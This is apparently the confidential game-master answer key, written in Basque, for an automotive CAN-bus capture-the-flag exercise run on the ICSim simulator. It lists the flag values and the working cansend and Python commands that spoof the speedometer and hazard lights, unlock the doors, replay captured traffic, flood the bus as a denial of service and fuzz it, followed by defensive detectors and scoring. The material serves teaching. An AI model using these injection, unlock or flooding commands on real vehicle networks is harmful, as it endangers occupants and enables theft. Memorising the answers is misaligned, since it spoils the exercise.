# Erantzun Master — CTF Automotive UrbanFleet 2026
## ⚠️ KONFIDENTZIALA — Game Master / Irakaslearentzat soilik

[Gaztelaniazko bertsioa](04_Respuestas_master.md)

> **Ez banatu parte-hartzaileei inola ere.**  
> Inprimatu dokumentu hau eta CTF bitartean taldeen eskuetatik kanpo gorde.

---

## Flag-en erreferentzia azkarra

| Flaga | Balio zuzena | Tolerantzia |
|---|---|---|
| FLAG-F1A | `0x244` | Tolerantziarik gabe — zehatza |
| FLAG-F1B | `0x19B` | Tolerantziarik gabe — zehatza |
| FLAG-F1C | `0x01` | Tolerantziarik gabe — zehatza |
| FLAG-F2A | ICSim-en kaptura abiadura >200 | Bisuala — pantailan balioztatu |
| FLAG-F2B | ICSim-en kaptura hazard aktibo | Bisuala — pantailan balioztatu |
| FLAG-F2C | ICSim-en kaptura ateak irekita | Bisuala — pantailan balioztatu |
| FLAG-F2D | 30 s-z exekutatutako scripta/begizta | Taldearen terminalean balioztatu |
| FLAG-F3 | 3 eta 15 segundoren artean (ICSim aldakorra) | Edozein balio justifikatua |
| FLAG-F4 | 500 fps baino gehiago canbusload >%80 | Kapturarekin frogatuta |
| FLAG-BONUS | Demo funtzionatu + kodea | Zuzenean balioztatu |

---

## 1. FASEA — Erantzun zehatzak

### FLAG-F1A — Abiadura-adierazlearen IDa: `0x244`

`0x244` IDak frameak etengabe bidaltzen ditu. 3. byteak (0-oinarritutako indizea) abiadura adierazten du:
- `0x00` = 0 km/h
- `0xFF` = abiadura maximoa (~260 km/h ICSim-en)

Baieztatzeko komandoa:
```bash
cansniffer vcan0
# Controls-en azeleratzailea mugitu → 244 IDaren 3. bytea aldatzen da
```

---

### FLAG-F1B — Ateen IDa: `0x19B`

`0x19B` IDak ateen egoera kudeatzen du. 0. bytea:
- `0x0F` = ate guztiak itxita/blokeatuta
- `0x00` = ate guztiak irekita/desblokeatuta
- Bit indibidualek ate indibidualak kontrolatzen dituzte

---

### FLAG-F1C — Ezkerreko txandakatzearen bytea 0x188-n: `0x01`

`0x188` IDak seinaleak kudeatzen ditu. 0. bytea:
- `0x00` = seinalerik ez
- `0x01` = ezkerreko txandakatzearen adierazlea
- `0x02` = eskuineko txandakatzearen adierazlea
- `0x03` = larrialdiko argiak (hazard = biak aldi berean)

---

## 2. FASEA — Komando zuzenak

### FLAG-F2A — Abiadura-adierazlea maximoan

```bash
# 1. aukera: behin bakarrik
cansend vcan0 244#00000000FF000000

# 2. aukera: begiztan (ICSim-ek egonkor erakusteko beharrezkoa)
while true; do cansend vcan0 244#00000000FF000000; sleep 0.01; done

# 3. aukera: Python
python3 -c "
import can, time
bus = can.interface.Bus(channel='vcan0', bustype='socketcan')
msg = can.Message(arbitration_id=0x244, data=[0,0,0,0,0xFF,0,0,0], is_extended_id=False)
while True:
    bus.send(msg)
    time.sleep(0.01)
"
```

### FLAG-F2B — Larrialdiko argiak (hazard)

```bash
while true; do cansend vcan0 188#0300000000000000; sleep 0.01; done
```

### FLAG-F2C — Ate guztiak desblokeatu

```bash
cansend vcan0 19B#0000000000000000
# Behin nahikoa da — egoera mantentzen da controls-ek beste balio bat bidali arte
```

### FLAG-F2D — 30 segundoko begizta

F2A/F2B/F2C-ko edozein begizta 30 segundoz mantenduta. Onartu baldin eta:
- Terminalak begizta aktibo erakusten badu
- ICSim-ek denbora horretan egoera mantentzen badu

---

## 3. FASEA — Replay: komandoak eta balioak

### Grabazioa

```bash
candump -l vcan0
# Formatuko fitxategia sortzen du: candump-YYYY-MM-DD_HHMMSS.log
# controls erabili grabazioan ateak irekitzeko/ixteko
# Ctrl+C gelditzeko
```

### Replay iragazia (ateak soilik)

```bash
python3 ../CANbus_ICSim_Ciber/scripts/replay_attack.py \
    --log candump-*.log \
    --interface vcan0 \
    --id 19B
```

### FLAG-F3 — Gutxieneko grabaketa-denbora

**ICSim-arekin balio tipikoa: 5 segundo.**

ICSim-ek ateen egoera bidaltzen du controls-arekin elkarreragiten den bakoitzean. Erabiltzaileak lehen 5 segundoan ateak irekitzen baditu, log-ak desblokeo gertaera izango du.

**3 eta 15 segundoren arteko edozein balio onartu** taldeak bere log-arekin justifika badezake.

---

## 4. FASEA — DoS eta Fuzzing

### Oinarrizko kargaren neurketa

```bash
canbusload vcan0@500000 1
# ICSim-eko balio tipikoa: %2-5
```

### DoS erasoa

```bash
python3 ../CANbus_ICSim_Ciber/scripts/can_dos.py --interface vcan0 --id 0x000 --rate 10000
# Edo cansend begiztan sleep gabe:
while true; do cansend vcan0 000#0000000000000000; done
```

### DoS bitarteko neurketa

```bash
# Beste terminal batean DoS aktibo dagoen bitartean:
canbusload vcan0@500000 1
# Espero den balioa: >%80
```

### FLAG-F4 — fps tasa

**Balio tipikoa:** 1.000 - 10.000 fps VMaren hardwarearen arabera.  
**500 fps baino gehiago onartu** `canbusload`-ek >%80 erakusten badu.

### Fuzzing zuzendua

```bash
python3 ../CANbus_ICSim_Ciber/scripts/fuzz_can.py \
    --interface vcan0 \
    --mode targeted \
    --id 0x244 \
    --rate 100 \
    --duration 30
```

Espero diren portaera anomaloak: abiadura-adierazlea irregularki aldatzen, ICSim izoztuta edo ezinezko balioak erakusten.

---

## BONUS — Onartutako kontraneurriak

### A aukera — Maiztasunaren anomalia-detektagailua

```python
import can, time, collections

bus = can.interface.Bus(channel='vcan0', bustype='socketcan')
baseline = {0x244: 50, 0x188: 10, 0x19B: 5}  # Espero diren Hz
counters = collections.defaultdict(int)
window_start = time.time()

for msg in bus:
    counters[msg.arbitration_id] += 1
    elapsed = time.time() - window_start
    if elapsed >= 1.0:
        for id_, count in counters.items():
            if id_ in baseline and count > baseline[id_] * 2:
                print(f"[ALERTA] ID {hex(id_)} {count} Hz-tan (oinarria: {baseline[id_]} Hz)")
        counters.clear()
        window_start = time.time()
```

### B aukera — ID whitelist-a

```python
import can

WHITELIST = {0x244, 0x188, 0x19B}
bus = can.interface.Bus(channel='vcan0', bustype='socketcan')

for msg in bus:
    if msg.arbitration_id not in WHITELIST:
        print(f"[BLOKEATUTA] ID ezezaguna: {hex(msg.arbitration_id)}")
```

### C aukera — Rate limiter

```python
import can, time, collections

bus = can.interface.Bus(channel='vcan0', bustype='socketcan')
MAX_RATE = {0x244: 100, 0x188: 20, 0x19B: 10}  # fps gehienekoak
counts = collections.defaultdict(int)
window = collections.defaultdict(float)

for msg in bus:
    aid = msg.arbitration_id
    now = time.time()
    if now - window[aid] >= 1.0:
        counts[aid] = 0
        window[aid] = now
    counts[aid] += 1
    limit = MAX_RATE.get(aid, 50)
    if counts[aid] > limit:
        print(f"[RATE LIMIT] ID {hex(aid)}: {counts[aid]} fps (muga: {limit})")
```

---

## Gehieneko puntuazioa

| Fasea | Oinarrizko maximoa | Bonuarekin maximoa |
|---|---|---|
| F1 | 150 | 200 |
| F2 | 200 | 250 |
| F3 | 150 | 200 |
| F4 | 150 | 175 |
| Bonus | 100 | 100 |
| **Guztira** | **750** | **925** |
